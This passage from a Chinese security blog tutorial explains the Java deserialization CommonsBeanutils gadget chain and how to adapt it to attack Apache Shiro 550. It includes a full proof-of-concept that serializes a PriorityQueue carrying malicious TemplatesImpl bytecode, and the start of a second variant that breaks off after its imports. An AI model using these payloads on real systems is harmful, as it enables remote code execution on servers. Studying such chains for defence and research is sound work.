+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">BeanComparator</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">property</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">(</span><span class="n">property</span><span class="p">,</span><span class="w"> </span><span class="n">ComparableComparator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在ysoserial中是利用的无参构造器实例化一个BeanComparator对象并用反射去进行操作变量的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;property&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">field_name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">field_value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">object</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">field_name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">field_value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java"  target="_blank" rel="noopener"
+    >https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java</a></p>
+<p><img src="/p/cb%E9%93%BE/image-20260114195855002.png"
+	width="1659"
+	height="714"
+	srcset="/p/cb%E9%93%BE/image-20260114195855002_hu_b5b1c1048cbbd40f.png 480w, /p/cb%E9%93%BE/image-20260114195855002_hu_7f6fd9d2828bf3c5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114195855002"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="557px"
+	
+></p>
+<p>然后就会调用到<code>TemplatesImpl.getOutputProperties()</code>，这个方法可以调用<code>newTransformer()</code></p>
+<p><img src="/p/cb%E9%93%BE/image-20260114200445090.png"
+	width="1238"
+	height="558"
+	srcset="/p/cb%E9%93%BE/image-20260114200445090_hu_dd1f22d8a240f327.png 480w, /p/cb%E9%93%BE/image-20260114200445090_hu_ce545d5e7ebc0de4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114200445090"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="532px"
+	
+></p>
+<p>接下就说往上找了，哪里调用 compare()？</p>
+<p>我们可以用到CC4中的PriorityQueue#readObject()方法，其实就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PriorityQueue#readObject()
+</span></span><span class="line"><span class="cl">    PriorityQueue#heapify()
+</span></span><span class="line"><span class="cl">        PriorityQueue#siftDown()    
+</span></span><span class="line"><span class="cl">            PriorityQueue#siftDownUsingComparator()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面的CC2/CC4链文章提到了，queue的size应该大于等于2，而add()也会执行compare，由于在BeanComparator的compare()方法中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对1、2进行排序。所以在初始化的时候，我们add任意值，然后利用反射修改成恶意TemplateImpl 对象,所以调用链以及poc如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">readObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">heapify</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">siftDown</span><span class="p">()</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">PriorityQueue</span><span class="err">#</span><span class="n">siftDownUsingComparator</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">BeanComparator</span><span class="err">#</span><span class="n">compare</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   					 </span><span class="n">PropertyUtils</span><span class="err">#</span><span class="n">getProperty</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">    					</span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    							</span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">newTransformer</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                    </span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getTransletInstance</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                        </span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">defineTransletClasses</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                            </span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">defineClass</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="poc1with-cc依赖">poc1(with CC依赖)
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;a&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Files</span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;D:\\1\\代码集合\\java代码\\CB\\src\\main\\java\\org\\example\\test.class&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[][]</span><span class="w"> </span><span class="n">codes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">code</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="n">codes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">comparator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;property&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="s">&#34;queue&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">,</span><span class="n">templates</span><span class="p">});</span><span class="c1">// 设置BeanComparator.compare()的参数,修改成恶意TemplateImpl 对象,queue 字段是数组类型,所以这里这里是数组，二就是readobject中有queue = new Object[size];由于size是2，若给queue只赋值一个template，后续fro循环会报错</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">(</span><span class="s">&#34;CC4.txt&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">field_name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">field_value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">object</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">field_name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">field_value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//定义序列化操作</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;CC4.txt&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//定义反序列化操作</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个是需要CC依赖的，下面给不需要CC依赖的</p>
+<h3 id="poc2without-cc依赖">poc2(without CC依赖)
+</h3><p>换成Shiro550打上面的链子会出现报错，表示没找到<code>org.apache.commons.collections.comparators.ComparableComparator</code>类，从全类名可以看到整个类其实是来自CC依赖的，不过换句话来说，commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽 然包含了一部分commons-collections的类，但却不全。这也导致了我们在用上面的poc打Shiro550的时候会失败</p>
+<p><img src="/p/cb%E9%93%BE/image-20260114222849024.png"
+	width="1275"
+	height="803"
+	srcset="/p/cb%E9%93%BE/image-20260114222849024_hu_fc7db6b4b4e21967.png 480w, /p/cb%E9%93%BE/image-20260114222849024_hu_ac1bdf901dc79695.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114222849024"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="381px"
+	
+></p>
+<p>所以我们要尝试找不需要CC依赖的CB链，我们先看看为什么我们上面的poc会用到CC依赖，看看<code>org.apache.commons.collections.comparators.ComparableComparator</code>这个类在哪里使用了</p>
+<p><img src="/p/cb%E9%93%BE/image-20260114223138590.png"
+	width="1113"
+	height="288"
+	srcset="/p/cb%E9%93%BE/image-20260114223138590_hu_793923527df50e9b.png 480w, /p/cb%E9%93%BE/image-20260114223138590_hu_11f4d8b108d9e810.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114223138590"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="386"
+		data-flex-basis="927px"
+	
+></p>
+<p>在<code>BeanComparator</code>类的构造函数处，如果没有显式传入<code>Comparator</code>的情况下，就会默认使用ComparableComparator作为比较器。</p>
+<p>既然是不需要ComparableComparator，那我们需要另外找一个类进行替代，该类需要满足以下条件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">实现java.util.Comparator接口和java.io.Serializable接口（要Comparator接口原因是定义了一个变量类型是 Comparator，那么只有实现了这个接口的类才能赋值给它。）
+</span></span><span class="line"><span class="cl">Java、shiro或commons-beanutils自带
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于commons-beanutils中，只有BeanComparator这一个类满足，我们查找一下JDK中的类。</p>
+<p>存在很多很多，常用的为<code>java.util.Collections$ReverseComparator</code>或者<code>java.lang.String$CaseInsensitiveComparator</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//下面这两个二选一都可以
+</span></span><span class="line"><span class="cl">setFieldValue(beanComparator, &#34;comparator&#34;, String.CASE_INSENSITIVE_ORDER);
+</span></span><span class="line"><span class="cl">setFieldValue(beanComparator, &#34;comparator&#34;, Collections.reverseOrder());
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>CASE_INSENSITIVE_ORDER</code>对象最后返回一个实例</p>
+<p><img src="/p/cb%E9%93%BE/image-20260114230024680.png"
+	width="1424"
+	height="434"
+	srcset="/p/cb%E9%93%BE/image-20260114230024680_hu_b144ec188958aa5.png 480w, /p/cb%E9%93%BE/image-20260114230024680_hu_748181a2f6c57768.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114230024680"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="787px"
+	
+></p>
+<p>reverseOrder函数最后会返回一个ReverseComparator2实例</p>
+<p><img src="/p/cb%E9%93%BE/image-20260114225716224.png"
+	width="1003"
+	height="261"
+	srcset="/p/cb%E9%93%BE/image-20260114225716224_hu_d6050155e277c89d.png 480w, /p/cb%E9%93%BE/image-20260114225716224_hu_e637866fbffec40c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114225716224"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="384"
+		data-flex-basis="922px"
+	
+></p>
+<p>我们只需要利用反射，将对应的comparator写入属性中，就不需要依赖CC库了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
